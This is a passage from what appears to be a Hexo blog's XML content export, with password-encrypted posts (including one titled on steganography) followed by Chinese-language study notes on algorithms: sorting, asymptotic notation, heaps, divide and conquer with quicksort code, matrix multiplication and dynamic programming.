9d784648eb22ba05046f93e5ec8ab56dc2796a8d2c40b3c8f0d6da64fdc7e395fb013d855c088a67ff558175a34b4e6be6901cb5d26ceba1723b8daa91887399506b51418e5a3909da608880169cf266e369192aa91e909d01e21f29aabae40656c700517445fa7d1b46c9044fe55ea5d28</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>密文</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>信息隐藏</title>
    <url>/2020/07/08/2020-07-08-Steganography/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。\n Oh, this is an invalid password. Check and try again, please." data-whm="解密内容无法验证，但您仍然可以看看。\n Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="加密文章，需要输入密码访问。</br> Hey, password is required here." /><label>加密文章，需要输入密码访问。</br> Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="9ad46a8dca28ba62c4cae1377bdc8e73a22ba0817d6edfcebf101e444e81b683">05748cba185f8d68c3b09211d41671065a2e1e42d27f9de8525b30b5d82287264a2e4f8b8b74b6c115a5a1bee0fb6f6ece35f40f7835016cb042479849d47514a80e5e143137309aa899d034381309f1d5805cec56842b923cf21332b726bb7f20feeaaa3f1869b52e58741965cc9264cefbb1809f908483cec41b39a906f3c0109c4b8b82953c79fc65332a94096313af59925e097684399436382993292f08452c40c039506a2113ea61edfd5323f146e8c7b513c20689cc93f88be47fab1bb5d2e6aa4d8af5d0fb9f07a317ff4219a62ef5af040c17380c88c7216b4aca2469313c88053f322c62c70221b85c0755256a81f69fd8c9f63b51705658c7607bc62102fcdebae6975f73f05cb388fac3d30d599c8f1bc8597a858e2e19e9ae5309bc3ed7b62510765dabcbc892230618fa57d40df4f59aa996fbd934fed05410f52f886a221a6321b94025c9b258e7199c22969371a1e3436dbf5b9ae0532913940872895a11acfaeaf47a83a5ee65a632231e61c4e6efd08aee76fa506213f55bb8f28a9786cf1c5ee088d40be3fe465d9011fe95f721bec07106e2f05bbcbff5097bc26a6fac52b2e333041a12c8f952fbd412aa0dc7728c4a3e174db03c2368f3b6abf5f35931d1afaa03e8f8be9113a4b4c80ae668f94321febc291914b833c3ab5f683ea885f800c85e055f61e16e8bea25bac0d21bebec2af6fc7888ccfc7cf01da3574f030a9061e09f6038f397a917d0f1b583fa2b4cd693f01cdfde3a6772982a57f5fabff5eaa2eced9f790724d7b6b0c92653588e252a5c9cff2b60b1ae435386282762fbef65a161aee08fc3117687218ec4b403cd2e30f9ae6ab9e955c10aec3eb318ef52245df70b5cb947961b0f9833d8538be93f1cb5538533e771ae0210c87c5bf291769d2ab5ecd07f33b2655b49487934c70cd413417b098f4087554ee7c2da61e1eb98103a9135c50cfca8ae8cc8a7fdd1418b19d1e2c18984269f93f8fd9b2dc5ddf63918d10333ff8cabbd13cc56750172b2a130106c87f7a05843e46e27b7977808aba54d49952cb642f1e59d2ca62b7613eea3a771bba73813fc5ffa2e8cb8c6a0efc0cf539fa46e62718ee9a1e160d3fa5a4dbf506bd82523a18d43a687b7dd340b90244fc8ae5bbd1520ded8f8b4e159d46e680532bfcda187022d602eca345f539db8e677991a1cf61360dc7e2d113906cd5c8720c012003c7564d0883ca8ce5e2def3a2b7281d34c54a9d46bf198d959e0c235b041e2ea0310ba35d3d75d25c6bad31ed6dea9f2d4eb3a7bd4c86312817b511eacb6dc2a2b6411c719e605548c471eca3df8552bef3a0236f27f10974ceeba83b016d20dce454ec37241b77715470db3854ce3dbf6b7506852a5eaf71c9aba6aaba470358ca514f770fd9280f646a4a88d9d21e110a18d86407c7b859c74dfe993d2954ed7dd59395cf985208c59c1bd074599f1f1479d4699d51862e9f0639fa6355b6438b9bc748eb956a44ff9d26191336ddc70ec1dad29c8a65b90778d9cf54e461adccc8702114ea0e861fb330ac22e0d38d83b2f521d327c259bcbba5bbf9ff94f2f21c0749210f514d50b64f71f7a542759d45433ff17898148416ea5aedce23492421f36bfd3633da6e8beb9edb6304e9a2bc7d9c33e3095ab612c1b8230181b5d341c2d8f709674aa761dd1cb9eff4259656fbb9a4007269b84f7ace5c1e6d4356204941ab2eac56d3975ad149ca79aeba3a4846de0ee4c6d6c1ed51fb34046621f329f9203abf4e60170aec0b043656cc244bec189c485a9a92c3350f42f0fe34c5c5f5a46bc6819c6d19a5decfecc5ba30860bd19a72f76c0f5519dcb7dbadceffa87b2831719043c1bf768ad150d407603c4ad4f6a3ecba03a106e42e7f0a91456dcbccb93519dd2b1f2d5f77eeb4ba556152c5f35baa7b088ca88e0d82bb1c99418067985e97294cb15a33e76a7f4c81e2779bc41d0585da940b3300d305c1bde7c3e1904768fb1f60240b8ef942b6384279ab313c5ed834f01846aa31b07663d5f93a22c4b05a18e346daabe689413095fa09479cea03abc1ba61608a5b30c26fabcf52c6a0dea0a64266a4906685b2b40fbe6554a01b4d0c98f62c49db50b1926aa5ec4a03dbb3ed7f85054d25fdd19e45e71513944dfbb7114b47fcbdd26f347609878365c06f98a475555674cfd32a44f2d50c98fe2280cf6122e5c03f9deeee5adc5f29d4145e4c11ffe79479c1cd3bd36ab14d59538d02aea90b44d95c40adf0247264d7eef36fc777b3230a9d9b554fb7726134fbe9c0fcb53740cad1cb781de3059c28fb4decdf598e20f330f22cbd314e05975d925efcd4c2aa10024c2551a09d24827a6e542add856d4896b27b36ecd846969cec6a3419b11384462bb5ca59b615d1f738e009e91d3357f902cb85278bc8e3ab156752601b210dc59758f5f5b974a7755b80989368bdaa7a32c4d532de3abbd29d87de21a50064657f043f87792477b1423d592e3ba53fa2ea77f469a6c9b13c9e7fe84e1c1e9a1186bbbd74ecb04469421f9333e26d8e76b4f1a0e34afa6125a83d8f6f716cbe6f466448f51fe8a16a1b97b93c1fcc007d6708071808b73554066759a48f23d1e1dc66020bd488c354506fda17a5a7ac615f7bdbe107a8458009ae3c9b22c6ba60accc81b90a0bf893ca6bcc8e2c521c4da7bba24f9f6219782dfe66e5e0ee54e45a48cf01f76be9609810df52203b2bc09ad7dbc611e92ef0259606a2ba4a630523388cee709ab9120f19506e4dd02bcae2d0c98678a3b3fb81cad4c043c69465b177e4e3e41c68e08977f01948c5f7e31d5df7fda0c183f38955c7cbed22a0fa8b2acd1b57d163a33b4ceff8df31e48f241bd333a78fe48f24f6de61e6e8007f0fb00ea388a29de31da53a9b91cf26fe3f4fd6304d104b28abf35abbfef42eabc775fa691f9f56bb17601d6912c3b7cd398f7c7dccb7ff61ae60c34297cd37ee897b786ed31777a09c912466b092cea22e28f0404f75692bf435519b3ee76ffab95b932e1e5ebdcac39a6c2a87a0a5df7f0eb09dedaa579fcd37c5b96e7e69ac13a163d5035ee01d7997c7075feb2195d26ece751c4a5c7f4b5c127024ca9e7031f0736627abbcb598704bc992c12ea4e9f8326739319e0fbd4874ca6131fd5663c826580e4f823730bdec47291c7cf34691a925642df691d54615e567d1256daf3ac20ce7d88f654b81ea8e8df8a004819a924c00ec0349ba958d695daffc8cd0300eae569551f2591a6b3a11f981e5a221f03144ffb7a1e0dfd2d781c7afc6fb71de2f4f9b30bc841e89e8ad2b8cf0cc1ab6a01396c038b4e613e46c674382bd984344c83db01555286ab562dad2edbc0c4d2b49536cedc97eb625c67f647a9201f1c66ddfb23f5454f025120aa0183b0876ada544306b85600f9884b9b38fb8092d96350edcd8fa68cad62f2979a478dca47987aabe6e24986a42f5719f9c5b27f80b0001019e544574b300da7ab5dbc6ef4afd0c324d348776aa74ce0bef91987917776d107ca2bdf0d54f955d3ce0d4682fe561d75f274839c3aeb14b7f6ed8b70fb9a96a0508204a009b90fc3ff402047bbd0c85bb855494aaaa8601964dec823b3293fc7829bd3cb73887dce912c4e50eaf24092f17805d54c6385a2b01551fe1985b099933c4dc382f3ba903f8563de8b82f1ba6a9ea5a277a07c179487785e62f62b6fcb4aaec56000a7712b037ad4f055d133acea5b97d902d8d841d06a1d517f971027b165675b9151aa256f636988e1caeae8fe3f81c48b770c36420f2487eba04e6609cae116bcaf0be69d48c1483459afc28ec93eb95ad77fad9abcb1ea2fa961061e2184c3d95bbf22f841996610c76752b710a774c63bfe8a7d086d3a7bc2bc01a133e19e24c90176d621273b1d85de02471a1e68c14f3598061f5305c3eb3b6abe51f947d09e2f20453ea237a29cded387f14c1fd694fc4ac5a01b5a1ea81063db62b0f2c486e857d51e1a8369ef531ebc02c2b0ce24909970f6698105077dbf4cd9c0f84b26bbd5c31791c790628cf4f9f40581915827bdea565c909e007098ac6ed2de31809a29906510a7606c54a19231280185d8a4fb3cc465319040ef361e7f63fbc9f07f11e46a1792b5e86291f330ac300808e244e2294d1c8075f1f71e92bba4f0741f45f8fa3438385f2b5f8501640552b0a7c3844d6d49f0dcf2601161c13ba3801a770e788af68908eb676eb247a3d51fc4dc746a2c630246ea02e27f7d00e33cd5927daa10c8f58806967aea35a78b1aaacfd112b75eb70967e21270a2b961d0566f84fe4ebec1c50a05569de03dcf4f5d177dc7fe890837983b2e038882c1b2873415a1c900cf64ed0a741204c350918f8da3f8c4d2eefa80c179109344541159cb38d0397d75cf248aa8f98d1d4f5af0f8e6c8b816180960666f67ebdece9c3e92fd7a2d029f5701c8128be3b03b9d008b9c399d8a2c8b084d02bb34bf3b034ef8efb9881dc511634f397afa09ca7049bf22edc4949ec219a9de54971c09f394397b801366f8e02bc06249ac2b2b63d462bc7468e4e68dd386ec16dfd1dd4a49f92683c1a671d21934b239a96c14c73b004eb1e2d559485f0c95eaea0fb98c300391e76e185a3f5ad14122f35f0fe31b04614a8da1811acd4892232a82b64404f5b8ea385f4c2dfdb87922d5bc3f77bd1948db47d52c51a9411a62756d9310594174f1181e5614f87b7eb325f346512eeafebac936bcabcaeff02230f662988b9c4984ed974f60904aa94e051b19f6a23003e476a1ca505871887b8f690b30f8cce98cb9bd73d68df061d8dd37de7791f42300ae9604d2b73acd735a882d52bb2a1a7cf72580aa1619a104d2d0d61fc0be791187fec0a3df82d1d58ef688eced8ecfc9bb74424b2cbd9442e1be30ef27366d146c4632b7387f58450a3116435c097d7db2f340ece33ba0c19862e1cd5434e0b911277f81ea73f6f3a7b9decc13543bd94fef4c1405b7b4d9626b5866a581f6a80037d9791c8f5e28001db30350744e496fd3ab1094c6fb6a665335021e588f158becff4bb136890b0693d9f73144e67baf856bda3907c1f21bdf2379aaaf459dd030ca595dd32353658019bcbcc1a36453cd0bb5b5be2e1310138b5e37c14c84f4748e9aff5a2c58e38ecb24fa24f115e8ee4e2d0ea49ed9bdeb8203c2e0c50443b4ce6697d5b39f7976cd3ab3e30e72ad6d2f9a78a6f35e678b36207caaabf5cefec04421b66a4608338fac7cc60d05d453e0543e46</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>密文</tag>
      </tags>
  </entry>
  <entry>
    <title>算法复习</title>
    <url>/2020/07/07/2020-07-07-algorithm/</url>
    <content><![CDATA[<h1 id="概述1——排序，算法复杂度"><a href="#概述1——排序，算法复杂度" class="headerlink" title="概述1——排序，算法复杂度"></a>概述1——排序，算法复杂度</h1><h3 id="二分搜索"><a href="#二分搜索" class="headerlink" title="二分搜索"></a>二分搜索</h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617203727265.png" alt="image-20200617203727265"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617203751549.png" alt="image-20200617203751549"></p>
<h3 id="合并排序-Θ-nlog-n"><a href="#合并排序-Θ-nlog-n" class="headerlink" title="合并排序  Θ(nlog^n^)"></a>合并排序  Θ(nlog^n^)</h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617204606235.png" alt="image-20200617204606235"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617230232234.png" alt="image-20200617230232234"></p>
<h3 id="选择排序-Θ-n-2"><a href="#选择排序-Θ-n-2" class="headerlink" title="选择排序   Θ(n^2^)"></a>选择排序   Θ(n^2^)</h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617204423709.png" alt="image-20200617204423709"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617204456644.png" alt="image-20200617204456644"></p>
<h3 id="插入排序-Θ-n-2"><a href="#插入排序-Θ-n-2" class="headerlink" title="插入排序  Θ(n^2^)"></a>插入排序  Θ(n^2^)</h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617204517210.png" alt="image-20200617204517210"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617204538007.png" alt="image-20200617204538007"></p>
<h2 id="O-上界-✍"><a href="#O-上界-✍" class="headerlink" title="O 上界  ✍"></a>O 上界  ✍</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617205321300.png" alt="image-20200617205321300"></p>
<p><strong>不等于∞，其实就是当n趋近于无穷时，f(n)不大于cg(n)</strong></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617205331994.png" alt="image-20200617205331994"></p>
<h2 id="Ω下界"><a href="#Ω下界" class="headerlink" title="Ω下界"></a>Ω下界</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617205622879.png" alt="image-20200617205622879"></p>
<p><strong>不等于0，其实就是当n趋近于无穷时，f(n)仍大于cg(n)</strong></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617205631847.png" alt="image-20200617205631847"></p>
<h5 id="Θ紧确界"><a href="#Θ紧确界" class="headerlink" title="Θ紧确界"></a><strong>Θ紧确界</strong></h5><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617205735762.png" alt="image-20200617205735762"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617205749193.png" alt="image-20200617205749193"></p>
<h5 id="o上界"><a href="#o上界" class="headerlink" title="o上界"></a><strong>o上界</strong></h5><p><strong>等于0，其实就是当n趋近于无穷时，f(n)<em>远远</em>小于cg(n)</strong></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617205905097.png" alt="image-20200617205905097"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619124823913.png" alt="image-20200619124823913"></p>
<h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><ul>
<li>传递性</li>
<li>自反性</li>
<li>对称性</li>
<li>倒置对称性</li>
</ul>
<h1 id="概述2——算法复杂度估计"><a href="#概述2——算法复杂度估计" class="headerlink" title="概述2——算法复杂度估计"></a>概述2——算法复杂度估计</h1><p>空间复杂度不可能超过时间复杂度S(n)=O(T(n))</p>
<h2 id="数学归纳法"><a href="#数学归纳法" class="headerlink" title="数学归纳法"></a>数学归纳法</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617214000566.png" alt="image-20200617214000566"></p>
<h2 id="Master-定理Theorem"><a href="#Master-定理Theorem" class="headerlink" title="Master 定理Theorem"></a>Master 定理Theorem</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617215312663.png" alt="image-20200617215312663"></p>
<h1 id="概述3——堆、堆排序"><a href="#概述3——堆、堆排序" class="headerlink" title="概述3——堆、堆排序"></a>概述3——堆、堆排序</h1><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617215645882.png" alt="image-20200617215645882"></p>
<h2 id="比较-堆操作-——堆排序：makeH-n-delete-gt-O-nlogn"><a href="#比较-堆操作-——堆排序：makeH-n-delete-gt-O-nlogn" class="headerlink" title="(比较)堆操作 ——堆排序：makeH()+n*delete()=&gt; O(nlogn)"></a>(比较)堆操作 ——堆排序：makeH()+n*delete()=&gt; O(nlogn)</h2><ul>
<li>辅助运算Sift-up 。主要思想：就是不断的和父节点比，直到为根节点或比父节点小时停止<ul>
<li>如果比父节点大，就互相替换，继续往上比。 <strong>O(logn)</strong></li>
</ul>
</li>
<li>辅助运算Sift-down。主要思想：就是不断的和子节点比，直到为叶子节点或比子节点都大时停止<ul>
<li>如果比子节点小，就替换一个较大的子节点（左右相比），继续往下比。 <strong>O(logn)</strong></li>
</ul>
</li>
<li>insert(H,x)：插入元素x到堆H中。插入元素到堆尾，然后调用辅助运算Sift-up。 <strong>O(logn)</strong></li>
<li>delete(H,i)。删除当前元素，将堆尾元素替上来，然后辅助运算Sift-down。 <strong>O(logn)</strong></li>
<li>delete-max(H)。删除根元素。<strong>O(logn)</strong></li>
<li>make-heap(A): 从数组A创建堆。<ul>
<li>方法1：从一个空堆开始，逐步插入A中的每个元素。<strong>O(nlogn)</strong></li>
<li>方法2：遍历【n/2】-&gt;【1】，每个都要遍历Sift-down(A[i])，使以A[i]为根节点的子树调整成为堆。 <strong>O(nlogn)</strong> 比方法1略微划算一些</li>
</ul>
</li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617224058787.png" alt="image-20200617224058787"></p>
<h2 id="非比较-计数排序-——O-n-k-k-θ-n-的时候就是O-n"><a href="#非比较-计数排序-——O-n-k-k-θ-n-的时候就是O-n" class="headerlink" title="(非比较)计数排序 ——O(n+k),k=θ(n)的时候就是O(n)"></a>(非比较)计数排序 ——O(n+k),k=θ(n)的时候就是O(n)</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617221841295.png" alt="image-20200617221841295"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617221824334.png" alt="image-20200617221824334"></p>
<h2 id="非比较-基数排序-——Θ-kn-Θ-n"><a href="#非比较-基数排序-——Θ-kn-Θ-n" class="headerlink" title="(非比较)基数排序 ——Θ(kn)=Θ(n)"></a>(非比较)基数排序 ——Θ(kn)=Θ(n)</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617221323955.png" alt="image-20200617221323955"></p>
<h1 id="二、分治"><a href="#二、分治" class="headerlink" title="二、分治"></a>二、分治</h1><h2 id="合并排序算法-——O-nlogn-，加上θ-n-的空间复杂度"><a href="#合并排序算法-——O-nlogn-，加上θ-n-的空间复杂度" class="headerlink" title="合并排序算法 ——O(nlogn)，加上θ(n)的空间复杂度"></a>合并排序算法 ——O(nlogn)，加上θ(n)的空间复杂度</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Algorithm: MERGESORT(A[low…high])</span><br><span class="line">输入：待排序数组A[low,...high]</span><br><span class="line">输出：A[low…high]按非降序排列</span><br><span class="line">1. if low&lt;high then</span><br><span class="line">2.   mid←(low+high)&#x2F;2</span><br><span class="line">3.   MERGESORT(A, low, mid)</span><br><span class="line">4.   MERGESORT(A, mid+1, high)</span><br><span class="line">5.   MERGE(A, low, mid, high)</span><br><span class="line">6. end if</span><br><span class="line"></span><br><span class="line">Algorithm: MERGE(A, p, q, r):</span><br><span class="line">输入：数组A[p...q]和A[q+1...r], 各自按升序排列</span><br><span class="line">输出：将A[p...q]和A[q+1...r]合并成一个升序排序的新数组</span><br><span class="line">1. s←p; t←q+1; k←p; &#123;s, t, p 分别指向A[p...q],A[q+1...r]和B&#125;</span><br><span class="line">2. while s≤q and t≤r</span><br><span class="line">3.    if A[s] ≤A[t] then </span><br><span class="line">4.       B[k]←A[s]</span><br><span class="line">5.       s ←s+1</span><br><span class="line">6.   else</span><br><span class="line">7.       B[k]←A[t]</span><br><span class="line">8.       t←t+1</span><br><span class="line">9.   end if</span><br><span class="line">10. k←k+1</span><br><span class="line">11.end while</span><br><span class="line">12.if s&#x3D;q+1 then B[k...r] ←A[t...r]</span><br><span class="line">13.   else B[k...r] ←A[s...q]</span><br><span class="line">14. end if</span><br><span class="line">15. A[p...q] ←B[p...q]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617230222046.png" alt="image-20200617230222046"></p>
<h2 id="分治的思想"><a href="#分治的思想" class="headerlink" title="分治的思想"></a>分治的思想</h2><ul>
<li><strong>划分</strong>：把规模较大的问题(n)分解为若干（通常为2）个<u>规模较小</u>的子问题（&lt;n）， 这些子问题<u>相互独立</u>且与<u>原问题同类</u>; (该子问题的规模减小到一定的程度就可以容易地解决)</li>
<li><strong>治理</strong>：依次求出这些子问题的解</li>
<li><strong>组合</strong>：把这些子问题的解组合起来得到原问题的解。<br>由于子问题与原问题是同类的,故分治法可以很自然地应用递归。 </li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617230546415.png" alt="image-20200617230546415"></p>
<p><strong>设计模式</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">divide_and_conquer(P)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">if</span>(|P|&lt;=n0)   </span><br><span class="line">            direct_process(P);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">            divide P into smaller subinstances P1,P2,…,Pa</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=a;i++)</span><br><span class="line">                 yi=divide_and_conquer(Pi);</span><br><span class="line">            merge(y1,y2,…,ya);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="快速排序——Θ-nlogn"><a href="#快速排序——Θ-nlogn" class="headerlink" title="快速排序——Θ(nlogn)"></a>快速排序——Θ(nlogn)</h2><p>具体是</p>
<ul>
<li>选定一个中心元素之后，就要将小于他的排在其后，大于他的排在其前</li>
<li>对分开的两个数组继续如上操作，不断分治（划分、治理）。组合</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Algorithm: QUICKSORT(A[low…high])</span><br><span class="line">输入: n个元素的数组A[low…high]</span><br><span class="line">输出：按非降序排列的数组A[low…high]</span><br><span class="line"><span class="number">1.</span>  <span class="keyword">if</span> low&lt;high then</span><br><span class="line"><span class="number">2.</span>     w ← SPLIT(A[low…high])  &#123;w为基准元素A[low]的新位置&#125;</span><br><span class="line"><span class="number">3.</span>     quicksort(A, low, w<span class="number">-1</span>)</span><br><span class="line"><span class="number">4.</span>     quicksort(A, w+<span class="number">1</span>, high)</span><br><span class="line"><span class="number">5.</span>  <span class="built_in">end</span> <span class="keyword">if</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i=left;j=right;<span class="keyword">int</span> temp=a[left];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;	<span class="comment">//从右向左找第1个小于中心元素的位置j</span></span><br><span class="line">	<span class="keyword">while</span>( a[j] &gt; temp &amp;&amp; i&lt;j)       j--;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;j)</span><br><span class="line">	&#123;	a[  i ]   =    a[  j ];</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//从左向右找第1个大于中心元素的位置i</span></span><br><span class="line">	<span class="keyword">while</span>(a[i]&lt;temp &amp;&amp; i&lt;j ) 	i++;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;j)</span><br><span class="line">	&#123;	a[j]=a[i];</span><br><span class="line">		j--;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">while</span>(i&lt;j);</span><br><span class="line">a[i]=temp;  <span class="comment">//将中心元素t填入最终位置</span></span><br><span class="line">w=i;</span><br><span class="line"></span><br><span class="line"><span class="comment">//快速排序 </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> leftIndex, <span class="keyword">int</span> rightIndex)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (leftIndex &gt;= rightIndex) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">int</span> left = leftIndex; </span><br><span class="line">    <span class="keyword">int</span> right = rightIndex; </span><br><span class="line">    <span class="keyword">int</span> key = arr[left]; <span class="comment">//待排序的第一个元素作为基准值 </span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;<span class="comment">//从左右两边交替扫描，直到left = right </span></span><br><span class="line">        <span class="keyword">while</span> (right &gt; left &amp;&amp; arr[right] &gt;= key)  &#123; </span><br><span class="line">            right--;<span class="comment">//从右往左扫描，找到第一个比基准值小的元素</span></span><br><span class="line">        &#125;</span><br><span class="line">        arr[left] = arr[right];<span class="comment">//找到这种元素将arr[right]放入arr[left]中 </span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right &amp;&amp; arr[left] &lt;= key) &#123; </span><br><span class="line">            left++;<span class="comment">//从左往右扫描，找到第一个比基准值大的元素</span></span><br><span class="line">        &#125;</span><br><span class="line">        arr[right] = arr[left];<span class="comment">//找到这种元素将arr[left]放入arr[right]中 </span></span><br><span class="line">    &#125;</span><br><span class="line">    arr[left] = key;<span class="comment">//基准值归位 </span></span><br><span class="line">    quickSort(arr, leftIndex, left - <span class="number">1</span>);<span class="comment">//对基准值左边的元素进行递归排序 </span></span><br><span class="line">    quickSort(arr, right + <span class="number">1</span>, rightIndex);<span class="comment">//对基准值右边的元素进行递归排序。 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="矩阵乘法"><a href="#矩阵乘法" class="headerlink" title="矩阵乘法"></a>矩阵乘法</h2><p>设A,B是两个n×n的矩阵，求C=AB.</p>
<ul>
<li><p>方法1: 直接相乘法   O(n^3)</p>
</li>
<li><p>方法2: 分块矩阵法(直接应用分治策略)   O(n^3)</p>
</li>
<li><p>方法3: Strassen算法(改进的分治策略)    O(n^log^2^7^)=O(n^2.81) </p>
</li>
</ul>
<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><ul>
<li><p>排列问题</p>
<ul>
<li>已知集合R={r1, r2,…, rn}，请设计一个算法生成集合R 中n 个元素的全排列</li>
<li>很简单，分治递归就好了</li>
</ul>
</li>
<li><p>寻找中项和第k小元素  Tn=Θ(n)</p>
<ul>
<li><p>寻找中项是寻找第k小元素的一个特列。如果能解决寻找第k小元素的问题，那么当k= ⎡ n/2 ⎤时，解决的就是寻找中项问题。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618000823253.png" alt="image-20200618000823253"></p>
</li>
</ul>
</li>
<li><p>最接近点对问题</p>
<ul>
<li><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618001135406.png" alt="image-20200618001135406"></p>
</li>
<li><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618001105447.png" alt="image-20200618001105447"></p>
</li>
<li><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618001121031.png" alt="image-20200618001121031"></p>
</li>
</ul>
</li>
<li><p>棋盘覆盖问题</p>
<ul>
<li><p>在一个2k×2k 个方格组成的棋盘中，恰有一个方格与其他方格不同，称该方格为一<strong>特殊方格**</strong>(<strong>红色表示</strong>)**，且称该棋盘为一特殊棋盘。在棋盘覆盖问题中，要用图示的4种不同形态的L型骨牌覆盖给定的特殊棋盘上除特殊方格以外的所有方格，且任何2个L型骨牌不得重叠覆盖。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618001000290.png" alt="image-20200618001000290"></p>
</li>
</ul>
</li>
</ul>
<h1 id="二、动态规划"><a href="#二、动态规划" class="headerlink" title="二、动态规划"></a>二、动态规划</h1><p>借助于变量存储中间计算结果，消除重复计算。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618001324885.png" alt="image-20200618001324885"></p>
<p>基本思想</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002627455.png" alt="image-20200618002627455"></p>
<p>动态规划基本步骤</p>
<ul>
<li><p>找出最优解的性质，并刻划其结构特征。</p>
</li>
<li><p>递归地定义最优值。</p>
</li>
<li><p>以<strong>自底向上</strong>的方式计算出最优值。</p>
</li>
<li><p>根据计算最优值时得到的信息，构造最优解。</p>
</li>
</ul>
<h2 id="矩阵链相乘-——Θ-n-3"><a href="#矩阵链相乘-——Θ-n-3" class="headerlink" title="矩阵链相乘  ——Θ(n^3^)"></a>矩阵链相乘  ——Θ(n^3^)</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002116437.png" alt="image-20200618002116437">    可以递归地定义C[i,j]为：</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002153871.png" alt="image-20200618002153871"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002229245.png" alt="image-20200618002229245"></p>
<h2 id="0-1背包问题-✍"><a href="#0-1背包问题-✍" class="headerlink" title="0-1背包问题  ✍"></a>0-1背包问题  ✍</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002737940.png" alt="image-20200618002737940"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002710822.png" alt="image-20200618002710822"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002851946.png" alt="image-20200618002851946"></p>
<p>可是一维数组又会导致，前面更新的值，影响后面的值</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002946332.png" alt="image-20200618002946332"></p>
<h2 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><p>给定两个定义在字符集<strong>∑</strong>上的字符串A和 B，长度分别为n和m，现在要求它们的最长公共子序列的长度值(最优值)，以及对应的子序列(最优解) 。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618005033825.png" alt="image-20200618005033825"></p>
<h2 id="其他问题-1"><a href="#其他问题-1" class="headerlink" title="其他问题"></a>其他问题</h2><ul>
<li><p>钢条切割问题：<img src="/2020/07/07/2020-07-07-algorithm/image-20200618004917079.png" alt="image-20200618004917079"></p>
</li>
<li><p>最大子数组问题sum[i+1] = max(sum[i]+a[i+1], a[i+1])</p>
</li>
